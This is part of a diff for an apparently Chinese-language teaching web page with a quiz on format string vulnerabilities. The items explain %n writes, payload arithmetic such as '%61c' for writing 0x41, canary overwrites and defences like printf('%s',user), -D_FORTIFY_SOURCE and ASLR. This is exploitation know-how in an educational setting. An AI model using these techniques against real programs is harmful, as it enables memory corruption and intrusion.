+ {q:'printf("%2$d", 10, 20, 30) 输出什么？',a:'输出 <code>20</code>。<code>%2$d</code> 是位置参数，直接取第 2 个参数，跳过第一个。'},
+ {q:'为什么 printf("%s%s%s%s") 会崩？',a:'每个 <code>%s</code> 从栈上取 4 字节<b>当地址</b>去读内存；栈上的值大多不是合法可读地址 → 段错误。这就是最廉价的 DoS。'},
+ {q:'%n 和 %d 最大的区别是什么？',a:'<code>%d</code> 是"读 + 打印"，<code>%n</code> 是"写"——它把已输出字符数写进参数所指地址，32 位下一次写 <b>4 字节</b>。'},
+ {q:'想写一个字节 0x41 到某个地址，%[n]c 里 n 是多少？',a:'0x41 = 65，n = 65 − 4 = <b>61</b>。即 <code>%61c</code>。'},
+ {q:'为什么要在格式串里塞地址，而不是作为参数传？',a:'因为漏洞现场是 <code>printf(user)</code>，攻击者<b>只能控制格式串本身</b>，传不了别的参数。而格式串（缓冲区）就在栈上，所以把地址写进格式串 = 把地址放到了栈上。'},
+ {q:'canary 那题里 foo[3] 的写入为什么影响了 canary？',a:'<code>%n</code> 一次写 <b>4 字节</b>，而 <code>foo[3]</code> 后面紧跟着 canary，所以 <code>0x00000080</code> 的后 3 个零字节把 canary[0..2] 冲成了 0。'},
+ {q:'str_fmt_attack 里 %n 写入的值为什么不是 4？',a:'因为 payload 前面被 <code>snprintf</code> 自动拼上了 <code>"Invalid Password!!! "</code>（20 字符）。写入值 = <b>20 + 4 + n</b>。算 payload 时必须把这段前缀算进去。'},
+ {q:'除了改代码，还有哪些机制能挡住这类攻击？',a:'<code>printf("%s",user)</code>（根治）；编译器 <code>-Wformat-security -D_FORTIFY_SOURCE=2</code>；运行期 Canary / ASLR / DEP（都能被"先泄露再绕过"的思路对抗，所以要叠加使用）。'}
+];
+const ql=document.getElementById('quizList');
+QUIZ.forEach((item,i)=>{
+  const d=document.createElement('div');
+  d.className='quiz'; d.id='qq'+i;
+  d.innerHTML='<div class="qt">'+(i+1)+'. '+item.q+'</div>'+
+    '<button class="ghost" onclick="tog(\'qq'+i+'\')">看答案</button>'+
+    '<div class="ans">'+item.a+'</div>';
+  ql.appendChild(d);
+});
+</script>
+</body>
+</html>
